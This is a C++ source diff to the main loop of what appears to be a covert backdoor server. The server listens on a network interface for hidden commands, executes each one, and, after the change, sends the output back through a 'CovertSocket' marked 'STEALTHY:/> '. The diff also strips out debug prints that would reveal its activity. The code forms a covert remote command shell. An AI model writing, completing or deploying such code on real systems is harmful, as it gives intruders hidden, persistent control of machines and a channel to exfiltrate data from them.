@@ -153,12 +153,11 @@ int main(int argc, char * argv[]) {
 
     TrafficAnalyzer * trafficAnalyzer = TrafficAnalyzer::getInstance();
     //start monitoring for UDP traffic. If it is our own, it needs handling, if not, add it to traffic analyzer
-    CovertSocket * socket = new CovertSocket(trafficAnalyzer); //how we respond to commands
+    CovertSocket * socket = CovertSocket::getInstance(); //how we respond to commands
     monitor = NetworkMonitor::getInstance(); //how we listen for commands
     while(keepListening){
 
         string command = monitor->listenForTraffic(listeningInterface); //this will hang until a single unit of data is received and then return it
-        cout << "Back Out" << endl;
 
         if(strcmp(command.c_str(), "-1")==0){
             shutdownServer(0);
@@ -168,17 +167,15 @@ int main(int argc, char * argv[]) {
             break;
         }
 
-        cout << "The Command Given Is: >" << command << "<" << endl;
-
         string response = executeCommand(command);
 
-        cout << "Back From Execution" << endl;
+        if(keepListening == false){
+            break;
+        }
 
-        cout << response << endl;
-
+        socket->send("STEALTHY:/> " + response);
     }
 
-    cout << "Now Here" << endl;
 
     Logger::debug("Loop Killed. Terminating");
 
